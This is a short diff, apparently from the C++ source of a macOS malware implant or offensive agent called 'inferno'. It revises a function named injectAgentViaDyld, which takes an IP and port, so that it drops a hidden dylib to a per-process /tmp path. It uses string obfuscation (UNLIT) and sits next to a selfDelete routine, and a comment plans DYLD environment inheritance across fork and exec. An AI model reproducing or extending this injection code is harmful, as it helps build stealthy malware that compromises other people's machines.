@@ -343,8 +343,8 @@ void selfDelete(const std::string& path) {
 
 #if defined(__APPLE__) && !defined(INFERNO_TESTING)
 bool injectAgentViaDyld(const std::string& ip, uint16_t port) {
-    // 1. Extract dylib to temp path
-    std::string dylib_path = UNLIT("/tmp/.inferno_agent.dylib");
+    // 1. Extract dylib to process-specific temp path (avoid races)
+    std::string dylib_path = UNLIT("/tmp/.inferno_agent_") + std::to_string(::getpid()) + UNLIT(".dylib");
     if (!extractAgent(dylib_path)) return false;
 
     // 2. Set environment for shim — inherits across fork+exec
